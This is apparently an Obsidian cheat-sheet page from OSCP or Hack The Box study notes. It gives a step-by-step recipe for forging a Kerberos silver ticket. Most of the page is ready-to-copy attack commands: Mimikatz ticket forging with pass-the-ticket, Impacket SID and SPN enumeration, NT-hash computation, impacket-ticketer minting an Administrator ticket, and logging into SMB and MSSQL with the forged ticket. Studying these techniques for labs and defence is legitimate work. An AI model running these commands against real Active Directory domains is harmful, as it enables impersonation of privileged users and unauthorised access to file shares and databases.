**Purpose:** Forge a Kerberos service ticket (TGS) for a particular service.

**When to use:** You have the secret of the service account and the information needed to construct a ticket.

### **Required information**

- Domain name
- Domain SID
- Service account NTLM hash or suitable encryption key
- Target hostname
- Service SPN
- Username to place in the ticket

### **Windows — Mimikatz**

Example: forging a CIFS ticket for `FILE01`.

```
kerberos::golden /domain:domain.local /sid:<DOMAIN_SID> /target:FILE01.domain.local /service:cifs /rc4:<SERVICE_ACCOUNT_HASH> /user:Administrator /ptt
```

---

### **Step 1 : Get domain SID**

(Windows) User shell  : Get domain SID
```dataviewjs
const command = "get-addomain | Select-Object DomainSID";

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 250);
});
```

Or from KALI
```dataviewjs
const command = "impacket-lookupsid domain.local/user:Password123!@<DC_IP>";

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 250);
});
```

Or use the domain SID shown in BloodHound/domain enumeration.

---
### **Step 2 : Get SPN of svc account**

Get the**Service Principal Name (SPN)** of the SQL Server account
```dataviewjs
const command = 'Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName';

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 250);
});
```

Or from KALI
```dataviewjs
const command = `impacket-GetUserSPNs DOMAIN.LOCAL/user:'password' -dc-ip <DC_IP>`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 250);
});
```

---
### **Step 3 : Convert plaintext to NTLM**

Replace the {Service1} with password
```dataviewjs
const command = `python3 -c 'from impacket.ntlm import compute_nthash; print(compute_nthash("Service1").hex())'`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```

---
### **Step 4 : Create Ticket (Ticketer)**

Kali — Impacket
```
impacket-ticketer \
-nthash <SERVICE_ACCOUNT_HASH> \
-domain-sid <DOMAIN_SID> \
-domain domain.local \
-spn cifs/FILE01.domain.local \
-user-id 500 Administrator
```

Then:

```dataviewjs
const command = `
export KRB5CCNAME=Administrator.ccache`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 250);
});
```

To check whether ticket generated properly
```dataviewjs
const command = `klist`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 250);
});
```

---
### **Step 5 : Login with the Ticket**

Login with the respective associated service

SMB > Impacket-smbclient
MSSQL > Impacket-mssqlclient

Since we forwarded 1433 port to our attack machine, we need to regulate /etc/hosts file according to it.

sudo gedit /etc/hosts
```dataviewjs
const command = `240.0.0.1 nagoya.nagoya-industries.com`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 250);
});
```

```dataviewjs
const command = `impacket-mssqlclient -k DC01.oscp.exam`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 250);
});
```
or
```dataviewjs
const command = `impacket-mssqlclient -debug -k -no-pass -windows-auth nagoya-industries.com/Administrator@nagoya.nagoya-industries.com`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 250);
});
```

```dataviewjs
const command = `impacket-smbclient -k -no-pass \
domain.local/Administrator@FILE01.domain.local`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 250);
});
```

**Remember:**

- Silver Tickets are service-specific.
- A CIFS ticket is not automatically a ticket for HTTP, MSSQL or another service.
- Forging a ticket does not automatically grant local administrator or domain administrator privileges.
- The service must accept the forged ticket, and the identity must have the required permissions.

---

## **How to obtain the domain SID**

Useful for Silver and Golden Ticket construction.

### **Windows**

```
whoami /user
```

For the domain SID:

```
Get-ADDomain | Select-Object DomainSID
```



---

# HTB Cheatsheet

```
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid S-1-5-21-... -domain domain.htb -spn cifs/target.domain.htb administrator
```
